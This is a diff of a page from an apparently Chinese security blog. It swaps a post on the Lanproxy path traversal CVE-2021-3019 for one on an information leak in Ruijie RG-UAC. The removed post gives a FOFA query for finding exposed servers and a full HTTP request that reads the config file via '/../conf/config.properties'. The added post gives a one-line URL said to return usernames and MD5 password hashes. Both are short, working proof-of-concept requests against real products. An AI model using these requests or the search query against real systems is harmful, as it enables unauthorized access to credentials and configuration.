@@ -5,7 +5,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8" >
     <meta name="baidu-site-verification" content="dIcXMeY8Ya" />
     
-    <title>CVE 2021 3019 Lanproxy 路径遍历漏洞 | GMF信息小站</title>
+    <title>锐捷RG-UAC信息泄漏 | GMF信息小站</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" >
     <meta name="keywords" content="givemefivw, POC&EXP, Web安全, 渗透测试, 编程语言" >
     <meta name="description" content="信息安全小站" >
@@ -17,7 +17,7 @@
     <link rel="shortcut icon" href="/favicon.ico" >
     
     
-<link rel="stylesheet" href="/css/style.css?v=1615352585466.css">
+<link rel="stylesheet" href="/css/style.css?v=1615352585419.css">
 
     <!--[if lt IE 9]>
     
@@ -50,11 +50,11 @@
         <div class="dropnav icon-paragraph-justify" id="JELON__btnDropNav"></div>
         <ul class="menu hidden" id="JELON__menu">
             
-            <li rel="/2021/01/16/CVE-2021-3019-Lanproxy-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/index.html" class="item ">
+            <li rel="/2021/03/10/%E9%94%90%E6%8D%B7RG-UAC%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/index.html" class="item ">
                 <a href="/" title="首页" class="icon-home">&nbsp;首页</a>
             </li>
             
-            <li rel="/2021/01/16/CVE-2021-3019-Lanproxy-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/index.html" class="item ">
+            <li rel="/2021/03/10/%E9%94%90%E6%8D%B7RG-UAC%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/index.html" class="item ">
                 <a href="/about/" title="关于" class="icon-about">&nbsp;关于</a>
             </li>
             
@@ -105,31 +105,27 @@
 <!-- 文章 -->
 <article class="post article">
     <header class="text-center">
-        <h3 class="post-title"><span>CVE 2021 3019 Lanproxy 路径遍历漏洞</span></h3>
+        <h3 class="post-title"><span>锐捷RG-UAC信息泄漏</span></h3>
     </header>
     <p class="post-meta text-center">
         givemefivw 发表于
-        <time datetime="2021-01-16T12:05:17.000Z">2021-01-16</time>
+        <time datetime="2021-03-10T05:02:19.000Z">2021-03-10</time>
     </p>
     <div id="JELON__articlePostContent" class="post-content">
-        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，支持tcp流量转发，可支持任何tcp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面…）。目前市面上提供类似服务的有花生壳、TeamView、GoToMyCloud等等，但要使用第三方的公网服务器就必须为第三方付费，并且这些服务都有各种各样的限制，此外，由于数据包会流经第三方，因此对数据安全也是一大隐患。</p>
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>FOFA搜索：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header&#x3D; &quot;Server: LPS-0.1&quot;</span><br></pre></td></tr></table></figure>
-<p>登陆页面抓包<br>POC:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;..&#x2F;conf&#x2F;config.properties HTTP&#x2F;1.1</span><br><span class="line">Host: host:8090</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko&#x2F;20100101 Firefox&#x2F;84.0</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;json; charset&#x3D;utf-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 29</span><br><span class="line">Origin: http:&#x2F;&#x2F;host:8090</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;host:8090&#x2F;</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;&quot;,&quot;password&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/01/16/CVE-2021-3019-Lanproxy-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/1.png"></p>
+        <h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;host&#x2F;get_dkey.php</span><br></pre></td></tr></table></figure>
+<p>即可获得用户名和MD5加密密码</p>
 
     </div>
     <p class="eof">-- EOF --</p>
     <p class="post-meta">
         <span class="post-cat">分类：
-            <a class="cat-link" href="/categories/CVE-2021/">CVE-2021</a>
+            <a class="cat-link" href="/categories/%E6%9D%82%E9%A1%B9%E6%BC%8F%E6%B4%9E/">杂项漏洞</a>
         </span>
         <span class="post-tags">
             标签：
             
     
-        <a href="/tags/%E5%A4%8D%E7%8E%B0/" title="复现">复现</a>
+        <a href="/tags/POC/" title="POC">POC</a>
     
 
         </span>
@@ -155,20 +151,16 @@
     
     <span class="prev fl">
         上一篇<br >
-        <a href="/2021/01/16/CVE-2020-17519-Apache-Flink-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">
-            
-                CVE-2020-17519 Apache Flink 任意文件读取漏洞
-            
-        </a>
+        <a href="javascript: void(0);">没有上一篇了</a>
     </span>
     
 
     
     <span class="next fr">
         下一篇<br >
-        <a href="/2021/01/16/%E6%9C%AA%E6%8E%88%E6%9D%83%E9%AA%8C%E8%AF%81%E6%80%BB%E7%BB%93/">
+        <a href="/2021/03/10/Exchange-SSRF/">
             
-                未授权验证总结
+                Exchange SSRF
             
         </a>
     </span>
@@ -346,7 +338,7 @@
     <!--博客js脚本 -->
     <!-- 这里放网站js脚本 -->
 
-<script src="/js/main.js?v=1615352585467.js"></script>
+<script src="/js/main.js?v=1615352585421.js"></script>
 
 
 </body>
